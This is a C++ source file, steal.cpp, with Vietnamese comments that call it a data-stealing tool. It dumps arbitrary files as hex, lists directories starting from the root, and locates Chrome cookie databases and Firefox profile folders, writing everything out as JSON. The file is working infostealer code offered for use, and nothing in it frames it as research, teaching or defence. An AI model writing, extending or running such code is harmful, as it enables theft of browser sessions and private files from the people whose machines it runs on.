// steal.cpp — Đánh cắp dữ liệu: đọc file, liệt kê thư mục, lấy browser data
// Usage: ./steal type=<file|dir|browser> path=<path>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <dirent.h>
#include <string>
#include <sys/stat.h>
#include <unistd.h>

static std::string get_param(int argc, char* argv[], const char* key, const char* def = "") {
    std::string prefix = std::string(key) + "=";
    for (int i = 1; i < argc; ++i) {
        std::string arg(argv[i]);
        if (arg.find(prefix) == 0) return arg.substr(prefix.length());
    }
    return def;
}

static void steal_file(const char* path) {
    FILE* f = fopen(path, "rb");
    if (!f) {
        std::fprintf(stdout, "{\"error\":\"cannot open: %s\"}\n", path);
        return;
    }
    std::fprintf(stdout, "{\"path\":\"%s\",\"data\":\"", path);

    // Base64-like dump (giới hạn 64KB)
    unsigned char buf[4096];
    size_t total = 0;
    while (total < 65536) {
        size_t n = fread(buf, 1, sizeof(buf), f);
        if (n == 0) break;
        for (size_t i = 0; i < n && total < 65536; ++i, ++total) {
            std::fprintf(stdout, "%02x", buf[i]);
        }
    }
    std::fprintf(stdout, "\"}\n");
    fclose(f);
}

static void steal_dir(const char* path) {
    DIR* d = opendir(path);
    if (!d) {
        std::fprintf(stdout, "{\"error\":\"cannot open dir: %s\"}\n", path);
        return;
    }
    std::fprintf(stdout, "{\"path\":\"%s\",\"entries\":[", path);
    bool first = true;
    struct dirent* entry;
    while ((entry = readdir(d))) {
        if (!first) std::fprintf(stdout, ",");
        std::fprintf(stdout, "{\"name\":\"%s\",\"type\":%d}", entry->d_name, entry->d_type);
        first = false;
    }
    std::fprintf(stdout, "]}\n");
    closedir(d);
}

static void steal_browser() {
    std::fprintf(stdout, "{\"browsers\":[");
    bool first = true;

    // Chrome
    const char* home = getenv("HOME");
    if (home) {
        std::string chrome = std::string(home) + "/.config/google-chrome/Default/Cookies";
        if (access(chrome.c_str(), F_OK) == 0) {
            if (!first) std::fprintf(stdout, ",");
            std::fprintf(stdout, "{\"name\":\"chrome\",\"cookies\":\"%s\"}", chrome.c_str());
            first = false;
        }

        std::string firefox = std::string(home) + "/.mozilla/firefox";
        if (access(firefox.c_str(), F_OK) == 0) {
            if (!first) std::fprintf(stdout, ",");
            std::fprintf(stdout, "{\"name\":\"firefox\",\"profile\":\"%s\"}", firefox.c_str());
            first = false;
        }
    }
    std::fprintf(stdout, "]}\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::fprintf(stdout, "{\"error\":\"Usage: %s type=<file|dir|browser> [path=<path>]\"}\n", argv[0]);
        return 1;
    }

    std::string type = get_param(argc, argv, "type", "file");
    std::string path = get_param(argc, argv, "path", "");

    if (type == "file") {
        if (path.empty()) {
            std::fprintf(stdout, "{\"error\":\"path required for file steal\"}\n");
            return 1;
        }
        steal_file(path.c_str());
    } else if (type == "dir") {
        if (path.empty()) path = "/";
        steal_dir(path.c_str());
    } else if (type == "browser") {
        steal_browser();
    } else {
        std::fprintf(stdout, "{\"error\":\"unknown steal type: %s\"}\n", type.c_str());
        return 1;
    }

    return 0;
}
